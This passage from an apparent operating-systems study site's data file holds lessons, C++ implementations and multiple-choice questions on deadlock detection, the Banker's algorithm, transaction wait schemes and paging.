class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Strategy</th><th>Approach</th><th>Pros</th><th>Cons</th></tr><tr><td>Prevention</td><td>Structurally eliminate one Coffman condition</td><td>Simple, no runtime overhead</td><td>Restricts resource usage</td></tr><tr><td>Avoidance</td><td>Dynamic safety check (Banker\'s)</td><td>Allows more concurrency</td><td>Requires max-need declaration</td></tr><tr><td>Detection + Recovery</td><td>Allow deadlock, detect cycle, recover</td><td>Maximum concurrency</td><td>Detection and recovery cost</td></tr><tr><td>Ostrich (Ignore)</td><td>Ignore the problem</td><td>Zero overhead</td><td>System hangs, manual intervention</td></tr></table><p class="learn-p"><b>In practice:</b> Most OS use Ostrich. Databases use Detection+Recovery. Safety-critical systems use Prevention.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Cycle in RAG does not equal deadlock (multi-instance):</b> With multiple instances, a cycle is necessary but NOT sufficient. You must run the detection algorithm.</li><li><b>Livelock is not deadlock:</b> In livelock, processes keep changing state but make no progress. Example: two people stepping aside simultaneously in a hallway.</li><li><b>Resource ordering must be consistent:</b> ALL threads must use the same ordering. Hard to maintain in large codebases.</li><li><b>Distributed deadlocks:</b> Can span multiple machines. No single node has the complete RAG. Detection requires global snapshots or probes.</li><li><b>Breaking No Preemption is not always safe:</b> Preempting works for CPU and memory but not for mutexes or printer output.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Strategy</th><th>Runtime Cost</th><th>Resource Utilization</th><th>Implementation Difficulty</th></tr><tr><td>Prevention (resource ordering)</td><td><span class="learn-complexity">O(1) per lock acquisition</span></td><td>Low-Medium</td><td>Low (discipline only)</td></tr><tr><td>Avoidance (Banker\'s)</td><td><span class="learn-complexity">O(n^2 * m) per request</span></td><td>Medium</td><td>Medium</td></tr><tr><td>Detection (cycle in RAG)</td><td><span class="learn-complexity">O(n^2) periodic</span></td><td>High</td><td>Medium</td></tr><tr><td>Ostrich</td><td><span class="learn-complexity">O(0)</span></td><td>Maximum</td><td>None</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What are the four necessary conditions for deadlock?</b><br>A: Coffman\'s conditions: (1) Mutual Exclusion, (2) Hold and Wait, (3) No Preemption, (4) Circular Wait. All four must hold simultaneously.</p><p class="learn-p"><b>Q2: Which Coffman condition is most practical to break?</b><br>A: Circular Wait, via resource ordering. Assign a global order to all lock types and require strictly increasing order. Widely used in practice (e.g., Linux kernel).</p><p class="learn-p"><b>Q3: Safe state vs unsafe state?</b><br>A: A safe state guarantees a safe sequence exists where every process can finish. An unsafe state means no such sequence exists, so deadlock MIGHT occur (not guaranteed).</p><p class="learn-p"><b>Q4: Why do most OS use the Ostrich approach?</b><br>A: Prevention restricts usage. Avoidance requires knowing max needs. Detection has overhead. Since deadlocks are rare, the cost of preventing exceeds the cost of occasional manual intervention.</p><p class="learn-p"><b>Q5: How do databases handle deadlocks?</b><br>A: Detection + recovery: maintain a wait-for graph, check for cycles, choose a victim transaction, abort/rollback it. PostgreSQL checks every deadlock_timeout (default 1 second).</p><p class="learn-p"><b>Q6: What is livelock and how do you fix it?</b><br>A: Livelock is when processes keep changing state in response to each other but make no progress (active but unproductive). Fix: add randomized backoff so processes don\'t keep making the same moves in sync.</p><p class="learn-p"><b>Q7: How are deadlocks detected in distributed systems?</b><br>A: Three approaches: (1) centralized coordinator collects wait-for graph fragments, (2) Chandy-Misra-Haas probe messages along wait edges, (3) timeout-based detection (abort if waiting too long). Most distributed databases use timeouts with Wait-Die or Wound-Wait prevention.</p></div>',
          code: `// Deadlock Detection using Resource Allocation Graph (RAG)
// Cycle detection in a directed graph using DFS
#include <iostream>
#include <vector>
#include <unordered_map>
using namespace std;

class DeadlockDetector {
    int numProcesses, numResources;
    // Adjacency list: node i -> list of nodes it points to
    // Processes: 0..numProcesses-1
    // Resources: numProcesses..numProcesses+numResources-1
    vector<vector<int>> adj;
    int totalNodes;

public:
    DeadlockDetector(int p, int r) : numProcesses(p), numResources(r) {
        totalNodes = p + r;
        adj.resize(totalNodes);
    }

    // Process pid requests resource rid
    void addRequest(int pid, int rid) {
        int rNode = numProcesses + rid;
        adj[pid].push_back(rNode); // P -> R (request edge)
        cout << "P" << pid << " requests R" << rid << endl;
    }

    // Resource rid is assigned to process pid
    void addAssignment(int rid, int pid) {
        int rNode = numProcesses + rid;
        adj[rNode].push_back(pid); // R -> P (assignment edge)
        cout << "R" << rid << " assigned to P" << pid << endl;
    }

    // DFS-based cycle detection
    bool hasCycleDFS(int node, vector<int>& visited, vector<int>& recStack) {
        visited[node] = 1;
        recStack[node] = 1;

        for (int neighbor : adj[node]) {
            if (!visited[neighbor]) {
                if (hasCycleDFS(neighbor, visited, recStack))
                    return true;
            } else if (recStack[neighbor]) {
                return true; // Back edge found -> cycle
            }
        }
        recStack[node] = 0;
        return false;
    }

    bool detectDeadlock() {
        vector<int> visited(totalNodes, 0);
        vector<int> recStack(totalNodes, 0);

        for (int i = 0; i < totalNodes; i++) {
            if (!visited[i]) {
                if (hasCycleDFS(i, visited, recStack)) {
                    return true;
                }
            }
        }
        return false;
    }
};

int main() {
    // Example: 3 processes, 3 resources (single instance each)
    DeadlockDetector dd(3, 3);

    // Setup: P0 holds R0, wants R1
    //        P1 holds R1, wants R2
    //        P2 holds R2, wants R0  -> Circular wait!
    dd.addAssignment(0, 0); // R0 -> P0
    dd.addRequest(0, 1);    // P0 -> R1
    dd.addAssignment(1, 1); // R1 -> P1
    dd.addRequest(1, 2);    // P1 -> R2
    dd.addAssignment(2, 2); // R2 -> P2
    dd.addRequest(2, 0);    // P2 -> R0

    cout << "\\nDeadlock " << (dd.detectDeadlock() ? "DETECTED!" : "not found.")
         << endl;

    // Example without deadlock
    cout << "\\n--- No Deadlock Example ---" << endl;
    DeadlockDetector dd2(2, 2);
    dd2.addAssignment(0, 0); // R0 -> P0
    dd2.addRequest(0, 1);    // P0 -> R1
    dd2.addAssignment(1, 1); // R1 -> P1
    // P1 does not request R0, so no cycle

    cout << "Deadlock " << (dd2.detectDeadlock() ? "DETECTED!" : "not found.")
         << endl;

    return 0;
}`,
          problems: [
            ['Deadlock in Operating System', 'https://www.geeksforgeeks.org/introduction-of-deadlock-in-operating-system/', 'Easy'],
            ['Deadlock Prevention and Avoidance', 'https://www.geeksforgeeks.org/deadlock-prevention/', 'Medium'],
            ['Resource Allocation Graph', 'https://www.geeksforgeeks.org/resource-allocation-graph-rag-in-operating-system/', 'Medium'],
            ['Livelock in OS', 'https://www.geeksforgeeks.org/deadlock-starvation-and-livelock/', 'Easy'],
            ['Detect Deadlock in RAG', 'https://www.geeksforgeeks.org/detect-cycle-in-a-directed-graph-using-bfs/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT a necessary condition for deadlock?', o: ['Mutual Exclusion', 'Hold and Wait', 'Starvation', 'Circular Wait'], a: 2},
            {q: 'If a Resource Allocation Graph has a cycle but a resource type has multiple instances, deadlock:', o: ['Definitely exists', 'May or may not exist', 'Definitely does not exist', 'Cannot be determined'], a: 1},
            {q: 'Which deadlock handling strategy is used by most modern general-purpose operating systems?', o: ['Prevention', 'Avoidance', 'Detection and Recovery', 'Ignore (Ostrich Algorithm)'], a: 3},
            {q: 'What distinguishes livelock from deadlock?', o: ['Livelock involves more processes', 'In livelock, processes are active but make no progress; in deadlock they are blocked', 'Livelock only occurs in distributed systems', 'Deadlock is a special case of livelock'], a: 1},
            {q: 'Which Coffman condition does resource ordering break?', o: ['Mutual Exclusion', 'Hold and Wait', 'No Preemption', 'Circular Wait'], a: 3},
            {q: 'In a RAG with single-instance resources, a cycle is:', o: ['Necessary but not sufficient for deadlock', 'Sufficient but not necessary for deadlock', 'Both necessary and sufficient for deadlock', 'Neither necessary nor sufficient'], a: 2},
          ],
        },
        // ----- Topic 1: Banker's Algorithm & Deadlock Detection -----
        {
          t: 'Banker\'s Algorithm & Deadlock Detection',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Cloud infrastructure providers must decide whether to grant a VM\'s request for more CPU cores or memory. Granting blindly may lead to a state where no VM can complete. The Banker\'s Algorithm formalizes this: Is it safe to grant this request? Same principle applies to database connection pools and any resource management system.</p></div><div class="learn-section"><div class="learn-h">Banker\'s Algorithm Overview</div><p class="learn-p">The <b>Banker\'s Algorithm</b>, proposed by Dijkstra, is a deadlock <b>avoidance</b> algorithm. It is named after the way a banker manages loans to ensure the bank never runs out of cash. The algorithm checks if granting a resource request will leave the system in a <b>safe state</b>.</p><p class="learn-p"><b>Required information:</b></p><ul class="learn-list"><li>Each process must declare its <b>maximum resource needs</b> in advance.</li><li>The system must know the <b>total available</b> resources of each type.</li></ul></div><div class="learn-section"><div class="learn-h">Data Structures</div><p class="learn-p">Let <b>n</b> = number of processes, <b>m</b> = number of resource types.</p><table class="learn-table"><tr><th>Structure</th><th>Dimension</th><th>Description</th></tr><tr><td><b>Available</b></td><td>[m]</td><td>Number of available instances of each resource type</td></tr><tr><td><b>Max</b></td><td>[n][m]</td><td>Maximum demand of each process for each resource type</td></tr><tr><td><b>Allocation</b></td><td>[n][m]</td><td>Currently allocated resources for each process</td></tr><tr><td><b>Need</b></td><td>[n][m]</td><td>Remaining needs: Need[i][j] = Max[i][j] - Allocation[i][j]</td></tr></table></div><div class="learn-section"><div class="learn-h">Safety Algorithm</div><p class="learn-p">The safety algorithm determines if the current state is safe:</p><ol class="learn-list"><li>Let <b>Work</b> = Available (copy), <b>Finish</b>[i] = false for all i.</li><li>Find a process i such that Finish[i] == false AND Need[i] &le; Work (for all resource types).</li><li>If found: Work = Work + Allocation[i]; Finish[i] = true; Go to step 2.</li><li>If no such process exists: If Finish[i] == true for all i, the system is in a <b>safe state</b>. The order of processes found is the <b>safe sequence</b>.</li></ol><p class="learn-p"><b>Time complexity:</b> <span class="learn-complexity">O(n^2 * m)</span> where n is the number of processes and m is the number of resource types.</p></div><div class="learn-section"><div class="learn-h">Resource Request Algorithm</div><p class="learn-p">When process P<sub>i</sub> makes a request Request<sub>i</sub>:</p><ol class="learn-list"><li>If Request<sub>i</sub> &gt; Need<sub>i</sub>, raise an error (process exceeded its declared maximum).</li><li>If Request<sub>i</sub> &gt; Available, the process must wait.</li><li>Pretend to allocate: Available -= Request<sub>i</sub>; Allocation<sub>i</sub> += Request<sub>i</sub>; Need<sub>i</sub> -= Request<sub>i</sub>.</li><li>Run the <b>safety algorithm</b>. If safe, grant the request. If unsafe, roll back and make the process wait.</li></ol></div><div class="learn-section"><div class="learn-h">Worked Example</div><p class="learn-p">5 processes (P0-P4), 3 resource types (A=10, B=5, C=7 total):</p><table class="learn-table"><tr><th>Process</th><th>Allocation (A B C)</th><th>Max (A B C)</th><th>Need (A B C)</th></tr><tr><td>P0</td><td>0 1 0</td><td>7 5 3</td><td>7 4 3</td></tr><tr><td>P1</td><td>2 0 0</td><td>3 2 2</td><td>1 2 2</td></tr><tr><td>P2</td><td>3 0 2</td><td>9 0 2</td><td>6 0 0</td></tr><tr><td>P3</td><td>2 1 1</td><td>2 2 2</td><td>0 1 1</td></tr><tr><td>P4</td><td>0 0 2</td><td>4 3 3</td><td>4 3 1</td></tr></table><p class="learn-p">Available = (10-7, 5-2, 7-5) = <b>(3, 3, 2)</b></p><p class="learn-p"><b>Safety check:</b></p><ul class="learn-list"><li>Work = (3,3,2). P1 needs (1,2,2) &le; (3,3,2). Execute P1. Work = (3,3,2)+(2,0,0) = (5,3,2).</li><li>P3 needs (0,1,1) &le; (5,3,2). Execute P3. Work = (5,3,2)+(2,1,1) = (7,4,3).</li><li>P4 needs (4,3,1) &le; (7,4,3). Execute P4. Work = (7,4,3)+(0,0,2) = (7,4,5).</li><li>P0 needs (7,4,3) &le; (7,4,5). Execute P0. Work = (7,4,5)+(0,1,0) = (7,5,5).</li><li>P2 needs (6,0,0) &le; (7,5,5). Execute P2. Work = (7,5,5)+(3,0,2) = (10,5,7).</li></ul><p class="learn-p"><b>Safe sequence:</b> &lt;P1, P3, P4, P0, P2&gt;. The system is in a safe state.</p></div><div class="learn-section"><div class="learn-h">Deadlock Detection Algorithm</div><p class="learn-p">When deadlock <b>avoidance</b> is not used, we need a <b>detection</b> algorithm. It is similar to the safety algorithm but uses <b>current requests</b> instead of maximum needs:</p><ol class="learn-list"><li>Work = Available; Finish[i] = (Allocation[i] == 0) for all i.</li><li>Find process i where Finish[i] == false AND Request[i] &le; Work.</li><li>Work += Allocation[i]; Finish[i] = true; Go to step 2.</li><li>If Finish[i] == false for any i, those processes are <b>deadlocked</b>.</li></ol><div class="learn-tip"><b>Tip:</b> Banker\'s Algorithm is frequently asked in interviews with a numerical example (see the worked example above). Practice computing the safe sequence quickly. The key insight is: we "simulate" running each process to completion and reclaiming its resources.</div></div><div class="learn-section"><div class="learn-h">Wait-Die &amp; Wound-Wait Schemes</div><p class="learn-p">These are <b>timestamp-based deadlock prevention</b> schemes used in database systems. Each transaction gets a timestamp when it starts; older transactions have lower timestamps.</p><table class="learn-table"><tr><th>Scheme</th><th>Older requests resource held by younger</th><th>Younger requests resource held by older</th></tr><tr><td><b>Wait-Die</b> (non-preemptive)</td><td>Older <b>waits</b></td><td>Younger <b>dies</b> (rolled back and restarts with same timestamp)</td></tr><tr><td><b>Wound-Wait</b> (preemptive)</td><td>Older <b>wounds</b> (forces rollback of) younger</td><td>Younger <b>waits</b></td></tr></table><p class="learn-p">Both schemes prevent circular wait because the direction of waiting is always consistent (old &rarr; young or young &rarr; old). Restarted transactions keep their original timestamp, so they eventually become the oldest and cannot be rolled back again &mdash; preventing starvation.</p><div class="learn-tip"><b>Tip:</b> Wound-Wait is generally preferred because it causes fewer unnecessary rollbacks. A younger transaction waiting for an older one will eventually succeed (the older will finish). In Wait-Die, younger transactions are repeatedly rolled back even when deadlock is unlikely.</div></div><div class="learn-section"><div class="learn-h">Deadlock Recovery</div><p class="learn-p">If deadlock is detected, recovery strategies include:</p><ul class="learn-list"><li><b>Process termination:</b> Abort all deadlocked processes, or abort them one by one until the cycle is broken.</li><li><b>Resource preemption:</b> Forcibly take resources from some processes. Must handle: selecting a victim, rollback (total or partial), and preventing starvation (don\'t always pick the same victim).</li></ul><div class="learn-warn"><b>Warning:</b> Banker\'s Algorithm assumes that processes declare their maximum needs upfront and that the number of resources is fixed. These assumptions may not hold in real systems, which is one reason why most OS use the Ostrich approach instead.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Approach</th><th>Input Required</th><th>When Run</th><th>Action on Failure</th></tr><tr><td>Banker\'s (Avoidance)</td><td>Max needs declared in advance</td><td>On every resource request</td><td>Make process wait</td></tr><tr><td>Detection (single instance)</td><td>Current allocation and requests</td><td>Periodically</td><td>Abort/rollback victim</td></tr><tr><td>Detection (multi-instance)</td><td>Allocation and Request matrices</td><td>Periodically</td><td>Abort victim(s)</td></tr><tr><td>Timeout-based detection</td><td>None (just time limits)</td><td>When wait exceeds threshold</td><td>Abort waiting process</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Banker\'s assumes fixed resource counts:</b> If resources can fail (a disk dies), the safety guarantee breaks.</li><li><b>Max needs must be declared upfront:</b> Impractical for general applications.</li><li><b>Multiple safe sequences may exist:</b> The algorithm finds ONE. Any is sufficient.</li><li><b>Detection frequency trade-off:</b> Too often wastes CPU. Too rarely means deadlocked processes sit idle longer.</li><li><b>Victim selection matters:</b> Choose based on priority, work invested, resources held, and rollback count.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Time Complexity</th><th>Space Complexity</th><th>When Used</th></tr><tr><td>Safety Algorithm</td><td><span class="learn-complexity">O(n^2 * m)</span></td><td><span class="learn-complexity">O(n * m) for matrices</span></td><td>Per resource request</td></tr><tr><td>Resource Request</td><td><span class="learn-complexity">O(n^2 * m) (includes safety check)</span></td><td><span class="learn-complexity">O(n * m)</span></td><td>Per request</td></tr><tr><td>Detection (RAG cycle)</td><td><span class="learn-complexity">O(n + e) DFS</span></td><td><span class="learn-complexity">O(n + e)</span></td><td>Periodic</td></tr><tr><td>Detection (multi-instance)</td><td><span class="learn-complexity">O(n^2 * m)</span></td><td><span class="learn-complexity">O(n * m)</span></td><td>Periodic</td></tr></table><p class="learn-p">Where n = number of processes, m = number of resource types, e = number of edges in RAG.</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Walk through the Banker\'s safety algorithm.</b><br>A: Initialize Work = Available, Finish[i] = false. Repeatedly find process i where Finish[i] is false and Need[i] &le; Work. If found, simulate completion: Work += Allocation[i], Finish[i] = true. If all finish, state is safe.</p><p class="learn-p"><b>Q2: Why is an unsafe state not the same as deadlock?</b><br>A: Unsafe means no safe sequence exists given MAXIMUM demands. But processes may not actually request their maximum. Deadlock occurs only if processes actually create a circular wait.</p><p class="learn-p"><b>Q3: Detection vs avoidance?</b><br>A: Avoidance prevents deadlock by refusing unsafe requests (needs max needs upfront). Detection allows deadlock then finds and breaks it using actual requests.</p><p class="learn-p"><b>Q4: Deadlock victim selection criteria?</b><br>A: Process priority, computation invested, resources held, how much more needed, and how many times previously chosen as victim (to prevent starvation).</p><p class="learn-p"><b>Q5: Why is Banker\'s not used in most OS?</b><br>A: Three limitations: (1) processes must declare max needs upfront, (2) resources must be fixed, (3) O(n^2*m) cost per request is too high for thousands of requests/second.</p><p class="learn-p"><b>Q6: Explain Wait-Die vs Wound-Wait.</b><br>A: Both use timestamps. In Wait-Die (non-preemptive): older waits, younger dies. In Wound-Wait (preemptive): older wounds (forces rollback of) younger, younger waits. Both prevent circular wait by enforcing consistent wait direction.</p><p class="learn-p"><b>Q7: How does a database choose a deadlock victim?</b><br>A: Criteria include: least work done (minimize rollback cost), fewest resources held, lowest priority, and number of times previously victimized (to prevent starvation). Some databases pick the youngest transaction.</p></div>',
          code: `// Banker's Algorithm Implementation in C++
#include <iostream>
#include <vector>
using namespace std;

class BankersAlgorithm {
    int n, m; // n processes, m resource types
    vector<vector<int>> max_need, allocation, need;
    vector<int> available;

public:
    BankersAlgorithm(int processes, int resources,
                     vector<vector<int>>& alloc,
                     vector<vector<int>>& maxNeed,
                     vector<int>& avail)
        : n(processes), m(resources), allocation(alloc),
          max_need(maxNeed), available(avail)
    {
        // Compute Need matrix: Need = Max - Allocation
        need.resize(n, vector<int>(m));
        for (int i = 0; i < n; i++)
            for (int j = 0; j < m; j++)
                need[i][j] = max_need[i][j] - allocation[i][j];
    }

    // Check if need[i] <= work for all resource types
    bool canFinish(int i, vector<int>& work) {
        for (int j = 0; j < m; j++)
            if (need[i][j] > work[j]) return false;
        return true;
    }

    // Safety Algorithm: returns true if system is in safe state
    bool isSafe(vector<int>& safeSequence) {
        vector<int> work = available;
        vector<bool> finish(n, false);
        safeSequence.clear();

        int count = 0;
        while (count < n) {
            bool found = false;
            for (int i = 0; i < n; i++) {
                if (!finish[i] && canFinish(i, work)) {
                    // Process i can finish; reclaim its resources
                    for (int j = 0; j < m; j++)
                        work[j] += allocation[i][j];
                    finish[i] = true;
                    safeSequence.push_back(i);
                    count++;
                    found = true;
                }
            }
            if (!found) return false; // No process can proceed -> unsafe
        }
        return true;
    }

    // Resource Request Algorithm
    bool requestResources(int pid, vector<int>& request) {
        // Step 1: Check request <= need
        for (int j = 0; j < m; j++) {
            if (request[j] > need[pid][j]) {
                cout << "Error: Request exceeds maximum claim." << endl;
                return false;
            }
        }
        // Step 2: Check request <= available
        for (int j = 0; j < m; j++) {
            if (request[j] > available[j]) {
                cout << "Process must wait (insufficient resources)." << endl;
                return false;
            }
        }
        // Step 3: Tentatively allocate
        for (int j = 0; j < m; j++) {
            available[j] -= request[j];
            allocation[pid][j] += request[j];
            need[pid][j] -= request[j];
        }
        // Step 4: Check safety
        vector<int> seq;
        if (isSafe(seq)) {
            cout << "Request GRANTED. Safe sequence: ";
            for (int p : seq) cout << "P" << p << " ";
            cout << endl;
            return true;
        } else {
            // Rollback
            for (int j = 0; j < m; j++) {
                available[j] += request[j];
                allocation[pid][j] -= request[j];
                need[pid][j] += request[j];
            }
            cout << "Request DENIED (would lead to unsafe state)." << endl;
            return false;
        }
    }

    void printState() {
        cout << "Process\\tAllocation\\tMax\\t\\tNeed" << endl;
        for (int i = 0; i < n; i++) {
            cout << "P" << i << "\\t";
            for (int j = 0; j < m; j++) cout << allocation[i][j] << " ";
            cout << "\\t\\t";
            for (int j = 0; j < m; j++) cout << max_need[i][j] << " ";
            cout << "\\t\\t";
            for (int j = 0; j < m; j++) cout << need[i][j] << " ";
            cout << endl;
        }
        cout << "Available: ";
        for (int j = 0; j < m; j++) cout << available[j] << " ";
        cout << endl;
    }
};

int main() {
    // Classic example: 5 processes, 3 resource types (A, B, C)
    vector<vector<int>> alloc = {{0,1,0},{2,0,0},{3,0,2},{2,1,1},{0,0,2}};
    vector<vector<int>> maxN  = {{7,5,3},{3,2,2},{9,0,2},{2,2,2},{4,3,3}};
    vector<int> avail = {3, 3, 2};

    BankersAlgorithm ba(5, 3, alloc, maxN, avail);
    ba.printState();

    cout << "\\n--- Safety Check ---" << endl;
    vector<int> seq;
    if (ba.isSafe(seq)) {
        cout << "System is SAFE. Sequence: ";
        for (int p : seq) cout << "P" << p << " ";
        cout << endl;
    }

    // P1 requests (1, 0, 2)
    cout << "\\n--- P1 requests (1, 0, 2) ---" << endl;
    vector<int> req = {1, 0, 2};
    ba.requestResources(1, req);

    return 0;
}`,
          problems: [
            ['Banker\'s Algorithm', 'https://www.geeksforgeeks.org/bankers-algorithm-in-operating-system-2/', 'Medium'],
            ['Deadlock Detection Algorithm', 'https://www.geeksforgeeks.org/deadlock-detection-algorithm-in-operating-system/', 'Medium'],
            ['Deadlock Recovery Strategies', 'https://www.geeksforgeeks.org/recovery-from-deadlock-in-operating-system/', 'Easy'],
            ['Banker\'s Algorithm Practice', 'https://www.geeksforgeeks.org/program-bankers-algorithm-set-1-safety-algorithm/', 'Hard'],
          ],
          mcqs: [
            {q: 'What is the time complexity of the Banker\'s Algorithm safety check?', o: ['O(n)', 'O(n * m)', 'O(n^2 * m)', 'O(n^2 * m^2)'], a: 2},
            {q: 'In the Banker\'s Algorithm, if the system is in an unsafe state, it means:', o: ['Deadlock has occurred', 'Deadlock will definitely occur', 'Deadlock might occur', 'The system must be restarted'], a: 2},
            {q: 'Which matrix in the Banker\'s Algorithm represents Max[i][j] - Allocation[i][j]?', o: ['Available', 'Request', 'Need', 'Work'], a: 2},
            {q: 'In the Wait-Die scheme, what happens when a younger transaction requests a resource held by an older one?', o: ['The younger waits', 'The younger is rolled back (dies)', 'The older is preempted', 'Both are rolled back'], a: 1},
            {q: 'Why do restarted transactions in Wait-Die/Wound-Wait keep their original timestamp?', o: ['To maintain FIFO order', 'To prevent starvation (they eventually become oldest)', 'For logging purposes', 'Because timestamps cannot be changed'], a: 1},
            {q: 'What is the key difference between deadlock detection and deadlock avoidance?', o: ['Detection is faster', 'Avoidance prevents deadlock before it occurs; detection allows it then recovers', 'Detection requires max resource needs', 'Avoidance uses wait-for graphs'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: MEMORY MANAGEMENT =====
    {
      id: 'mem', t: 'Memory Management',
      topics: [
        // ----- Topic 0: Paging & Page Tables -----
        {
          t: 'Paging & Page Tables',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When your Java application allocates an 8 GB heap on a server with only 4 GB RAM, paging makes this possible by mapping virtual addresses to physical frames on demand. Every memory access on a modern CPU goes through address translation via page tables and the TLB. Understanding paging is essential for diagnosing performance issues like TLB thrashing.</p></div><div class="learn-section"><div class="learn-h">Why Paging?</div><p class="learn-p">Early memory management schemes like <b>contiguous allocation</b> suffer from <b>external fragmentation</b>: as processes are loaded and removed, free memory is broken into small, non-contiguous chunks. Even if total free memory is sufficient, a large process may not fit. <b>Compaction</b> can solve this but is very expensive.</p><p class="learn-p"><b>Paging</b> eliminates external fragmentation by dividing both physical memory and logical (virtual) memory into fixed-size blocks:</p><ul class="learn-list"><li><b>Page:</b> A fixed-size block of logical (virtual) memory. Typical sizes: 4 KB, 8 KB, 2 MB, 1 GB.</li><li><b>Frame:</b> A fixed-size block of physical memory, same size as a page.</li></ul><p class="learn-p">Any page can be mapped to any frame. The mapping is stored in a <b>page table</b>.</p></div><div class="learn-section"><div class="learn-h">Address Translation</div><p class="learn-p">A logical address generated by the CPU is divided into two parts:</p><table class="learn-table"><tr><th>Component</th><th>Bits</th><th>Description</th></tr><tr><td>Page Number (p)</td><td>Higher-order bits</td><td>Index into the page table</td></tr><tr><td>Page Offset (d)</td><td>Lower-order bits</td><td>Offset within the page</td></tr></table><p class="learn-p"><b>Translation process:</b></p><ol class="learn-list"><li>Extract page number <b>p</b> and offset <b>d</b> from the logical address.</li><li>Look up page table entry at index <b>p</b> to get the frame number <b>f</b>.</li><li>Physical address = <b>f * page_size + d</b> (or equivalently, concatenate f and d).</li></ol><div class="learn-code">// Given: page size = 4 KB = 4096 = 2^12\n// Logical address = 0x00003A7F\n// Page number = 0x00003A7F / 4096 = 0x3 (page 3)\n// Offset = 0x00003A7F % 4096 = 0xA7F\n// If page table[3] = frame 6:\n// Physical address = 6 * 4096 + 0xA7F = 0x6A7F</div></div><div class="learn-section"><div class="learn-h">Page Table Structure</div><p class="learn-p">Each <b>page table entry (PTE)</b> contains:</p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>Frame Number</td><td>Physical frame where the page resides</td></tr><tr><td>Valid/Invalid Bit</td><td>1 if the page is in memory, 0 if not (page fault if accessed)</td></tr><tr><td>Protection Bits</td><td>Read/Write/Execute permissions</td></tr><tr><td>Dirty Bit (Modified)</td><td>1 if the page has been written to (used during page replacement)</td></tr><tr><td>Reference Bit (Accessed)</td><td>1 if the page has been recently accessed (used by replacement algorithms)</td></tr></table></div><div class="learn-section"><div class="learn-h">Translation Lookaside Buffer (TLB)</div><p class="learn-p">Accessing the page table for every memory access doubles the effective memory access time. The <b>TLB</b> is a small, fast, fully associative hardware cache that stores recently used page table entries.</p><p class="learn-p"><b>TLB hit:</b> Frame number is found directly in the TLB (no page table access needed). <b>TLB miss:</b> Must access the page table in memory, and the entry is loaded into the TLB.</p><p class="learn-p"><b>Effective Access Time (EAT):</b></p><div class="learn-code">EAT = hit_ratio * (TLB_access + memory_access)\n    + (1 - hit_ratio) * (TLB_access + memory_access + memory_access)\n\n// Example: TLB access = 10ns, Memory access = 100ns, hit ratio = 90%\n// EAT = 0.9 * (10 + 100) + 0.1 * (10 + 100 + 100)\n//     = 0.9 * 110 + 0.1 * 210 = 99 + 21 = 120ns</div><div class="learn-tip"><b>Tip:</b> Typical TLB hit ratios are 95-99% with 64-1024 entries. This makes paging practical despite the overhead.</div></div><div class="learn-section"><div class="learn-h">Multilevel Page Tables</div><p class="learn-p">For a 32-bit address space with 4 KB pages, the page table has 2^20 = 1M entries. At 4 bytes each, that\'s <b>4 MB per process</b> just for the page table &mdash; even if the process only uses a small fraction of its address space.</p><p class="learn-p"><b>Two-level page table:</b> The page table itself is paged. The logical address is split into:</p><div class="learn-code">// 32-bit address, 4 KB pages:\n// | 10 bits (outer page) | 10 bits (inner page) | 12 bits (offset) |\n//\n// Step 1: Use outer page number to index into outer page table\n// Step 2: Get the inner page table base address\n// Step 3: Use inner page number to index into inner page table\n// Step 4: Get frame number, combine with offset</div><p class="learn-p">Advantage: Only the outer page table (4 KB) must be in memory. Inner page tables are allocated on demand.</p></div><div class="learn-section"><div class="learn-h">Inverted Page Table</div><p class="learn-p">Instead of one page table per process, an <b>inverted page table</b> has one entry per physical frame. Each entry stores the process ID and page number mapped to that frame. This saves memory (one table for the whole system) but requires searching the table for translation. A hash table is typically used to speed up the search to <span class="learn-complexity">O(1)</span>.</p><div class="learn-warn"><b>Warning:</b> The inverted page table makes it harder to implement shared memory, because a single frame can only record one (pid, page) pair. Additional structures are needed for sharing.</div></div><div class="learn-section"><div class="learn-h">Copy-on-Write (COW)</div><p class="learn-p"><b>Copy-on-Write</b> is an optimization where forked processes share the parent\'s physical pages (marked read-only). Only when one process <b>writes</b> to a shared page does the OS actually copy it:</p><ol class="learn-list"><li>After <code>fork()</code>, parent and child share all physical frames. PTEs are marked <b>read-only</b> with a COW flag.</li><li>When either process writes, a <b>page fault</b> occurs.</li><li>The OS allocates a new frame, copies the page content, updates the writer\'s PTE to the new frame (read-write), and restarts the instruction.</li></ol><p class="learn-p">COW makes <code>fork()</code> nearly free (only copy the page table, not all memory). This is essential for <code>fork()+exec()</code> patterns where the child immediately replaces its address space.</p></div><div class="learn-section"><div class="learn-h">Contiguous Memory Allocation</div><p class="learn-p">Before paging, processes were allocated contiguous blocks of memory. When a process needs memory, the OS finds a hole using one of these strategies:</p><table class="learn-table"><tr><th>Strategy</th><th>Rule</th><th>Pro</th><th>Con</th></tr><tr><td><b>First Fit</b></td><td>Allocate the first hole that is big enough</td><td>Fastest search</td><td>Fragments the beginning of memory</td></tr><tr><td><b>Best Fit</b></td><td>Allocate the smallest hole that is big enough</td><td>Least wasted space per allocation</td><td>Leaves tiny unusable fragments</td></tr><tr><td><b>Worst Fit</b></td><td>Allocate the largest hole</td><td>Leaves larger remaining hole</td><td>Wastes large blocks, generally worst performance</td></tr></table><p class="learn-p"><b>First Fit</b> generally performs best in practice. All strategies suffer from <b>external fragmentation</b>, which is why paging was invented.</p></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Page Table 